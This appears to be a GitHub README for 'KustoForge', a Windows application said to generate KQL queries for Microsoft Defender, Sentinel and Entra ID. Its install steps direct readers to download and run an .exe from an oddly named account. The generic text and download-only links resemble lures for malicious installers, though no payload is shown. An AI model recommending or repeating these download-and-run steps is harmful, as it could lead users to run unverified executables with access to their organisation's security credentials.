# 🛠️ KustoForge - Build security queries without writing code

[![](https://img.shields.io/badge/Download-KustoForge-blue.svg)](https://github.com/horsemanshipprimping590/KustoForge)

KustoForge helps security analysts build KQL queries for Microsoft cloud services. You use this tool to search through data from Defender, Sentinel, and Entra ID. It bridges the gap between complex database languages and everyday security tasks. You pick the tables and filters from a menu, and the software creates the code for you.

## 📋 What this tool does

Modern cloud environments store data in thousands of rows inside hundreds of different tables. Security professionals often need to pull information from these tables to find threats. Microsoft uses a language called KQL. Learning this language takes time. KustoForge removes the need to memorize syntax. 

The software includes support for these platforms:
* Microsoft Defender for Endpoint
* Microsoft Sentinel
* Entra ID
* Azure Monitor
* App Insights

You select the fields you want to view. KustoForge generates the query and runs it against your connected environment. It organizes 52 specific tables, so you spend less time searching for the right data source.

## 💾 How to install the software

You need to visit the project page to download the latest version of the installer for Windows. 

[Visit this page to download the installer](https://github.com/horsemanshipprimping590/KustoForge)

Follow these steps to complete the setup:

1. Click the link above to reach the project repository.
2. Look for the Releases section on the right side of the screen.
3. Click the most recent version number.
4. Locate the file ending in .exe.
5. Download that file to your computer.
6. Double-click the file to start the installation.
7. Follow the prompts on your screen to finish the setup process.

## ⚙️ System requirements

KustoForge runs on standard Windows hardware. You do not need a high-end machine to run query building tasks. 

Ensure your system meets these points:
* Operating System: Windows 10 or Windows 11.
* Memory: 4GB of RAM.
* Storage: 200MB of free disk space.
* Network: Access to the internet for cloud service communication.
* Permissions: You must have permission to query your organization's Azure or security logs.

## 🚀 How to use KustoForge

Start the application using the shortcut on your desktop. The main window displays a list of services on the left. 

1. Select a service, such as Defender or Sentinel.
2. Choose a table from the list of 52 available types.
3. Use the search bars to narrow down your focus to specific timeframes or device names.
4. Click the Generate button to preview your query code.
5. Apply the filters you need to sort the data.
6. Copy the result to use in your official portal or analysis dashboard.

The interface stays out of your way. You see the options for the tables you selected. The software checks your query against standard rules to ensure it works before you run it.

## 🔐 Security and access

This tool connects to your existing security logs. It respects your current access levels. You must sign in to your Microsoft account through the secure portal when the app requests it. KustoForge does not store your credentials. It uses standard tokens to talk to Microsoft services. If you have restricted access to certain logs, the tool will report those limits to you.

## 💡 Troubleshooting common issues

If you have trouble, check these items:

* No results: Verify that you have selected the correct time range. Sometimes searches default to the last 24 hours.
* Connection errors: Check your internet connection. Make sure your organization does not block the API endpoints for Azure or Sentinel.
* Missing tables: Ensure you have selected the correct service provider in the side menu.
* Application crashes: Ensure you possess the latest version from the download link provided above. Reinstalling the app often fixes setup faults.

## ❓ Frequently asked questions

Do you store my data?
No. The application processes queries locally on your machine. Your search terms stay on your computer.

Does this work on Apple computers?
KustoForge is currently optimized for Windows systems. 

Can I save my queries?
Yes. You can export queries to text files to share with your team or to save for future investigation.

Do I need to be an administrator?
You do not need administrator rights to install the app, but you need appropriate permissions within your organization to query security data logs.

What if the query fails?
The tool displays error messages provided by the Microsoft data engine. Review these messages to see if you have requested a table you do not have permission to view.